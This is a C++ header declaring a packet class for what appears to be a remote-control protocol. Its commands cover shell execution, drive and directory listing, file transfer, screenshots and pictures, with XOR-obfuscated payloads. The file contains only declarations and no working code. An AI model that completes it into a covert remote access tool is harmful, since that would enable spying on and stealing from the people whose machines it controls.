#ifndef __COMMAND_PROTOCOL_H__
#define __COMMAND_PROTOCOL_H__

#include <Windows.h>
#include <exception>

#define HEADER_SIZE		(sizeof(CMDPacket::CMDHeader) + 4)
#define PROTOCOL_MAGIC	(0xDEAD1337)
#define RESERVED_SIZE	(0x05)

class CMDPacket
{
public:
	class InvalidHeaderError : public std::exception { };
	friend bool operator==(CMDPacket& p1, CMDPacket& p2);

	// the MSB determines if the packet is a request or a response
	enum CMDType : BYTE {
		SHELL_COMMAND = 0x00,		// 
		DRIVE_LIST = 0x01,			// 
		DIR_LIST = 0x02,			// 
		FILE_TRANSFER = 0x03,		// TODO:
		THUMBNAILS = 0x04,			// TODO:
		SCREENSHOT = 0x05,			// Done
		PICTURE = 0x06,				// Done

		RESPONSE = 0x80
	};
	// the MS digit determine the compression method
	// the LS digit determine the encryption method
	enum DataProcessing : BYTE {
		NONE = 0, XOR = 1, ROLLED_XOR = 2,
	};
	struct CMDHeader {
		DWORD checksum;
		DWORD timestamp;
		CMDType type;
		DataProcessing data_processing;
		BYTE data_processing_param;
		BYTE reserved[RESERVED_SIZE];	// must be zeroes
		DWORD data_len;
	};

	CMDPacket(const CMDType type, const DataProcessing data_processing, 
		const BYTE data_processing_param, const BYTE * data, const DWORD data_len);
	CMDPacket(const CMDType type, const DataProcessing data_processing, 
		const BYTE data_processing_param, const LPCTSTR data);
	CMDPacket(const CMDHeader psudo_header, const BYTE* data, const DWORD data_len);
	CMDPacket(const CMDPacket& other);
	CMDPacket& operator=(const CMDPacket& other);
	~CMDPacket();

	CMDType GetType() const { return this->header.type; }
	DataProcessing GetDataProcessing() const { return this->header.data_processing; }
	BYTE GetDataProcessingParam() const { return this->header.data_processing_param; }
	DWORD GetDataLength() const { return this->raw_data_len; }
	const BYTE * GetData() const { return this->raw_data; }
	
	// caller should delete the allocated memory
	BYTE * ToBinary(DWORD * length);
	static CMDHeader FromBinary(const BYTE * binary, const DWORD binary_len);

private:
	CMDHeader header;
	DWORD raw_data_len;
	BYTE * raw_data;
	BYTE * data;

	void process_data();
	void deprocess_data();
};

//
//struct ShellCommand {
//	LPCTSTR message;
//};
//
//struct FileTransfer {
//	DWORD path_length;
//	LPCTSTR path;
//	BYTE * content; //in the request this field is empty (length = 0)
//};
//
//struct Thumbnails {
//	DWORD path_length;
//	LPCTSTR path;
//	BYTE * content;	//in the request this field is empty (length = 0)
//};

bool operator==(const CMDPacket& p1, const CMDPacket& p2);
bool operator==(CMDPacket::CMDHeader& h1, CMDPacket::CMDHeader& h2);
DWORD calculate_checksum(const BYTE * data, const DWORD data_len);

#endif